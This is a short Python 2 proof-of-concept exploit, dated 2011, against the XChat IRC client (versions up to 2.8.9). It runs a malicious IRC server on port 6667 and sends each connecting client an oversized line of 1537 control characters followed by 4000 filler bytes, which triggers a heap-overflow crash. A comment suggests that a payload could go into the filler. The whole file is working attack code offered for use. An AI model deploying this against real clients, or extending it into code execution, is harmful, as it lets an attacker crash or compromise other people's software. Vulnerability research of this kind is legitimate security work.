#!/usr/bin/python

# Exploit Title: XChat Heap Overflow DoS Proof of Concept
# Date: June 2011
# Author: th3p4tri0t
# Software Link: http://xchat.org/
# Version: <= 2.8.9

# This only works on XChat on KDE, I'm not sure about windows.
# It has been tested on Ubuntu (failed), Kubuntu, and Bactrack 5
# It is a heap overflow and is some sort of error with X Windows
# It uses 1537 (this is the minimum) of the ascii value 20
# after this, an unknown number of any other character (did not check for special
# characters) is required to trigger a crash, presumably the payload will go here. 

# th3p4tri0t

import socket

print "XChat PoC Exploit by th3p4tri0t\n"

print "Creating server..."
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "    [*] Binding to socket..."
sock.bind(('127.0.0.1', 6667))

print "    [*] Listening on socket..."
sock.listen(5)

print "    [*] Accepting connection..."
(target, address) = sock.accept()

print "    [*] Sending payload..."
buffer = "hybrid7.debian.local "
buffer += chr(20) * 1537         # minimum required of this character
buffer += "A"*4000               # anything can go here and it still works.
buffer += " :*\r\n"

target.send(buffer)

target.close
sock.close